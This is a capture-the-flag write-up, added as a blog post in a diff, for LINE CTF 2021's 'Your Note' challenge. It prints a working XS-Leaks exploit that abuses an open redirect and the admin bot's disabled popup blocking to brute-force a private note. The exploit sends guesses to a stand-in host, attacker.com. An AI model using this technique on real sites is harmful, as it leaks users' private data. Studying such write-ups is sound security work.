@@ -1,0 +1,177 @@
+---
+layout: post
+title:  "Your Note"
+tags: ctf
+author: f02a8dfe
+---
+Secure private note service
+※ Admin have disabled some security feature of their browser...Flag Format: LINECTF{[a-z0-9-]+}
+LINECTF, 20th March 2021
+
+The author provided a link to a note taking site and a docker zip.
+
+The source code of `app.py` revealed the flag was added to the admin account notes:
+
+{% highlight python %}
+admin_note = Note(
+    title='flag',
+    content=app.config.get('FLAG'),
+    owner=admin
+)
+db.session.add(admin_note)
+db.session.commit()
+{% endhighlight %}
+
+`/login` included a `redirect` parameter which was appended to the `BASE_URL` allowing arbitrary redirects:
+
+{% highlight python %}
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    url = request.args.get('redirect')
+    if url:
+        url = app.config.get('BASE_URL') + url
+        if current_user.is_authenticated:
+            return redirect(url)
+{% endhighlight %}
+
+the `search` function `download` parameter allowed results to be downloaded:
+
+{% highlight python %}
+@app.route('/search')
+@login_required
+def search():
+    q = request.args.get('q')
+    download = request.args.get('download') is not None
+    if q:
+        notes = Note.query.filter_by(owner=current_user).filter(or_(Note.title.like(f'%{q}%'), Note.content.like(f'%{q}%'))).all()
+        if notes and download:
+            return Response(json.dumps(NoteSchema(many=True).dump(notes)), headers={'Content-disposition': 'attachment;filename=result.json'})
+    else:
+        return redirect(url_for('index'))
+    return render_template('index.html', notes=notes, is_search=True)
+{% endhighlight %}
+
+and the `report` function submitted a GET request to `CRAWLER_URL`:
+
+{% highlight python %}
+@app.route('/report', methods=['GET', 'POST'])
+@login_required
+def report():
+    if request.method == 'POST':
+        url = request.form.get('url')
+        proof = request.form.get('proof')
+        if url and proof:
+            res = requests.get(
+                app.config.get('CRAWLER_URL'),
+                params={
+                    'url': url,
+                    'proof': proof,
+                    'prefix': session.pop('pow_prefix')
+                }
+            )
+{% endhighlight %}
+
+crawler.js received the request, logged in as admin then visited the specified URL with a headless browser:
+
+{% highlight js %}
+const username = 'admin';
+const password = process.env.ADMIN_PASSWORD || 'password';
+
+    const url = req.query.url;
+    if (url && url.startsWith(base_url + '/') &&
+        proof && prefix && verify(proof, prefix)) {
+        const browser = await puppeteer.launch({
+            args: [
+                '--no-sandbox',
+                '--disable-popup-blocking',
+            ],
+            headless: true,
+        });
+        const page = await browser.newPage();
+
+        // login
+        await page.goto(base_url + '/login');
+        await page.type('input[name=username]', username);
+        await page.type('input[name=password]', password);
+        await Promise.all([
+            page.waitForNavigation({
+                waitUntil: 'domcontentloaded',
+                timeout: 10000,
+            }),
+            page.click('button[type=submit]'),
+        ]);
+
+        // crawl
+        page.goto(url).then(() => {
+            res.header('Access-Control-Allow-Origin', '*');
+            res.send({msg: 'Thank you for the report!'});
+        }).catch((err) => {
+            res.header('Access-Control-Allow-Origin', '*');
+            res.send({msg: 'ng'});
+        });
+        setTimeout(() => {
+            browser.close()
+        }, 60 * 1000)
+        return
+    }
+{% endhighlight %}
+
+the browser disabled popup blocking  and was closed after 60 seconds.
+
+By reporting a crafted link:
+
+`http://line.ctf/login?redirect=@attacker.com/script.htm`
+
+it was possible to redirect it to a malicious page:
+
+{% highlight html %}
+<script>
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function search(candidates,url,host) {
+  finished = false;
+  while (!finished) {
+	  for (i=0;i<candidates.length;i++) {
+		win = window.open(url + '/search?q=' + flag + candidates[i] + '&download');
+		await sleep(200);
+		try {
+			win.origin;
+			// if win.origin does not trigger an error no page was opened, must be a download
+			window.open(host + '/' + i + '/y/' + flag + candidates[i]);
+			flag = flag + candidates[i];
+			if (candidates[i] == '}') {
+				finished = true;
+			}
+			break;
+		} catch(e) {
+			// if navigation occured an error is triggered because window is cross-origin
+			window.open(host + '/' + i + '/n/' + flag + candidates[i]); 
+		}
+		//await sleep(200);  	
+	  }
+  }
+}
+
+url="http://line.ctf";
+host="http://attacker.com";
+
+candidates = "}0123456789-abcdefghijklmnopqrstuvwxyz".split("");
+flag = 'LINECTF{';
+
+search(candidates,url,host);
+</script>
+{% endhighlight %}
+
+The script takes advantage of `--disable-popup-blocking` to request a download of the search results. If the search string was found a download was triggered. If not the site returned an empty search results page. 
+
+It's possible to determine whether a download was started by checking the value of `window.origin`, as described by [XS Leaks Wiki][xsleaks]. If no error is triggered no page was loaded because no origin was set. 
+
+The script leverages this difference to brute force the content of the flag note. It sends incorrect guesses to `host/i/n/*` and correct guesses to `host/i/y/*`.
+
+The flag was recovered by generating several requests to the script while watching the web server logs and updating the flag string. 
+
+[xsleaks]: https://xsleaks.com/docs/attacks/navigations/
+
+
